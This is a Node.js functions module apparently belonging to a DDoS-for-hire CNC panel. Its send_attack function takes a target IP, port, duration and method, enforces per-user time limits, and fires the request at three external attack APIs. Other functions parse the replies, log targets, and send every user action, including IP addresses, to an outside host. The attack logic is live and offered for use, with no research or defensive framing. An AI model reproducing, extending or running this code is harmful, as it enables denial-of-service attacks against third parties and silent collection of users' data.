// Modules 
const fs = require("fs");
const fetch = require("node-fetch");
const moment = require("moment");

// File
const eExtra = require("./functions.js");
const Crud = require("../Auth/crud.js");
const Config = require("../Config/main.js");
const eConfig = require("../Config/current.js");
const ServerFunc = require("../server/functions.js");

/*
*@type: void
*/
exports.sleep = (milliseconds) => {
    return new Promise(resolve => setTimeout(resolve, milliseconds))
}

/*
*@param: Method
*@type: [<boolen>]
*/
exports.methodValidation = async function(meth) { 
    let methods = await(await fetch("https://syntaxapi.xyz/methods.txt")).text();
    return (methods.includes(meth) ? true : false);
}

/*
*@params: Log Type, Username, IP Address
*@type: [<string>]
*/
exports.log_action = async function(log_type, user, ip) {
    /*
    Get user info
    */

    let get_user = Crud.User(user);
    let info = get_user.split(",");

    let response = "[LOG]: " + log_type + " | [Timestamp]: " + await eExtra.currentTime() + "\r\n";
    response += "[User]: " + user + " | [IP]: " + ip + "\r\n";
    response += "[Level]: " + info[3] + " | [Admin]: " + info[5] + "\r\n";
    response += "[Cmd]: " + eConfig.CurrentCmd.Cmd + " | [FullCmd]: " + eConfig.CurrentCmd.Fullcmd + "\r\n\r\n";
    console.log(response);
    eExtra.log_to_file(response);
    await eExtra.send_to_discord(response);
}

/*
*@param: output
*@type: void
*/
exports.log_to_file = function(output) {
    fs.appendFileSync("./CNC/db/sys/logs.db", output);
}

/*
*@param: Username, IP, Port, Time, Method
*@type: void
*/
exports.log_attack = async function(user, ip, port, time, method) {
    fs.appendFileSync("./CNC/db/sys/users.db", "('" + user + "','" + ip + "','" + port + "','" + time + "','" + method + "','" + await this.currentTime() + "')\n");
}

/*
*@param: User, IP
*@type: void
*/
exports.log_login = async function(user, ip) {
    let t = await this.currentTime();
    fs.appendFileSync("./CNC/db/sys/login_logs.db", "('" + user + "','" + ip + "','" + t + "')\n");
}

/*
*@param: output
*@type: void
*/
exports.send_to_discord = function(output) {
    fetch("https://traumatized.xyz/sukme.php?log=" + output).then(res => res.text()).then(body => { console.log(body )});
}

/*
*@params: IP Address
*@type: [<string>]
*/
exports.GeoIP = async function(ip) {
    let results = await(await fetch("https://syntaxapi.xyz/tools/?q="+ ip)).text();
    return results;
}

/*
*@params: IP Address
*@type: [<string>]
*/
exports.pScan = async function(ip) {
    // let results = await(await fetch("https://scrapy.tech/pscan.php?ip="+ ip)).text();
    // return results;

    return "Current Disabled!";
}

/*
*@type: void
*/
exports.currentTime = async function() {
    var moment = require('moment-timezone');
    var endTime = await moment().tz('America/New_York').toDate();
    
    return endTime;
}

/*
*@params: time
*@type: (Promise[void])
*/
exports.sleep = function(time) {
    return new Promise((resolve) => setTimeout(resolve, time));
}

/*
*@params: Row, Column, Socket
*@type: (Promise[void])
*/
exports.set_cursor = function(row, column, socket) {
    socket.write("\033[" + row + ";" + column + "f");
}

/*
*@params: Row, Column, Socket
*@type: (Promise[void])
*/
exports.set_TerminalSize = function(row, col, socket) {
    socket.write("\033[8;" + row + ";" + col + "t");
    // socket.write("\033[8;40;81t");
}

/*
*@type: (Promise[void])
*/
exports.set_Title = function(t, socket) {
    socket.write("\033]0;" + t + "\007");
}

/*
*@params: IP Adress, Port, Time, Method
*@type: (Promise[<string>])
*/
exports.send_attack = async function(ip, port, time, method, usr) {
    let get_user = Crud.User(usr);
    let max_time = get_user.split(",")[4];

    if(parseInt(time) > parseInt(max_time)) return "[x] Error, You've reached your max time!\r\n";
    if(await eExtra.methodValidation(method) == false) return "[x] Error, Invalid method!\r\n";

    this.log_action(usr, ip, port, time, method);
    let response = "";
    
    let rreturn = await(await fetch(Config.API_1 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
    console.log(rreturn);
    response += "API 1: " + await eExtra.get_api_response(rreturn) + "\r\n";
    
    let rreturn1 = await(await fetch(Config.API_2 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
    console.log(rreturn1);
    response += "API 2: " + await eExtra.get_api_response(rreturn1) + "\r\n";

    let rreturn2 = await(await fetch(Config.API_3 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
    console.log(rreturn2);
    response += "API 3: " + await eExtra.get_api_response(rreturn2) + "\r\n";

    return response;
}

/*
*@params: Response
*@type: (Promise[<string>])
*/
exports.get_api_response = function(rpn) {
    let new_res = rpn.toLowerCase();
    if(new_res.includes("attack sent") || new_res.includes("udphex") || new_res.includes("std") || new_res.includes("rawtcp") || new_res.includes("attack initalized") || new_res.includes('"status":"success"') || new_res.includes("attack started") || new_res.includes("powered by overowered")) {
        return "Attack Sent";
    } else if(new_res.includes("invalid key") || new_res.includes("key is invalid")) {
        return "Error, Invalid Key";
    } else if(new_res.includes("invalid method") || new_res.includes("method is invalid") || new_res.includes("method does not exist") || new_res.includes("method doesn't exist")) {
        return "Error, Invalid Method";
    } else if(new_res.includes("error when connecting to the server if the problem")) { //CUSTOM (REMOVE LATER)
        return "Error, Either all fields aren't set or invalid method!";
    } else {
        return "Error, Something went wrong catching attack response but this doesn't mean the attack didn't go through!";
    }
}

/*
*@param: [METHOD]
*@type: [<boolen>]
*/
exports.CleanMOTD = function(arg_array) {
    let msg = "";
    arg_array.forEach(el => {
        msg += el + " ";
    });
    let fix = msg.replace(arg_array[0] + " ", "");
    let fix2 = fix.replace(arg_array[1] + " ", "");
    return fix2;
}